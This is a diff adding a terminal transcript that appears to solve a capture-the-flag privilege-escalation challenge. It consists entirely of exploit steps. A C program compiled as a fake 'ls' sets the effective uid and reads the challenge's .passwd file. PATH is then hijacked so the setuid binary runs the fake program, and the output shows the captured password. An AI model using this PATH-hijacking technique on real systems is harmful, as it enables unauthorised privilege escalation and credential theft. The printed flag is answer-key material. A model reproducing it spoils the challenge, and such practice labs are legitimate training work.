@@ -1,0 +1,24 @@
+
+app-script-ch12@challenge02:~$ ls
+ch12  ch12.c
+app-script-ch12@challenge02:~$ cd /tmp
+app-script-ch12@challenge02:/tmp$ vim fakebin.c
+
+--
+	#include <stdlib.h>
+	#include <stdio.h>
+
+	int main(){
+		setreuid (geteuid(), geteuid());
+		system("cat /challenge/app-script/ch12/.passwd");
+		return 0;
+	}
+--
+
+app-script-ch12@challenge02:/tmp$ gcc fakebin.c -o ls
+app-script-ch12@challenge02:/tmp$ cd
+app-script-ch12@challenge02:~$ PATH=/tmp:$PATH
+app-script-ch12@challenge02:~$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/opt/tools/checksec/:/opt/tools/checksec/
+app-script-ch12@challenge02:~$ ./ch12
+8a95eDS/*e_T#
